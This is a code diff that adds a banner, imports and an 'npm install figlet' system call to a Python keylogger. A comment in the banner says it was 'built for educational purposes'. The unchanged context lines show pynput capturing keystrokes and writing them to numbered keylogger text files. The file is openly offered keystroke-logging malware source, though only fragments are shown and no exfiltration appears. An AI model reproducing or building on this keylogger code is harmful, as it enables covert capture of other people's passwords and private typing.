@@ -1,4 +1,32 @@
+# Import modules
 import os
+import sys
+import argparse
+os.system ('npm install figlet')
+
+# Define GUI
+gui = """
+  
+ ________  _______   ________  _______   ________  ________  ________          
+|\   ____\|\  ___ \ |\   __  \|\  ___ \ |\   ____\|\   __  \|\   ___  \        
+\ \  \___|\ \   __/|\ \  \|\  \ \   __/|\ \  \___|\ \  \|\  \ \  \\ \  \       
+ \ \_____  \ \  \_|/_\ \   _  _\ \  \_|/_\ \  \  __\ \  \\\  \ \  \\ \  \      
+  \|____|\  \ \  \_|\ \ \  \\  \\ \  \_|\ \ \  \|\  \ \  \\\  \ \  \\ \  \     
+    ____\_\  \ \_______\ \__\\ _\\ \_______\ \_______\ \_______\ \__\\ \__\    
+   |\_________\|_______|\|__|\|__|\|_______|\|_______|\|_______|\|__| \|__|    
+   \|_________|                                                                
+                                                                               
+                                                                               
+
+                    ~Created by: SEREGON~
+             REMINDER THIS WAS BUILT FOR EDUCATIONAL PURPOSES
+               SO DON'T USE THIS FOR EVIL ACTIVITIES.
+"""
+
+
+
+
+import os   
 import time
 import pynput.keyboard as keyboard
 from datetime import datetime
@@ -19,7 +47,6 @@ file_num = 1
 
 # create the initial keylogger file
 open(f'keylogger{file_num}.txt', 'w').close()
-
 # create the keylogger function
 def on_press(key):
     global file_num
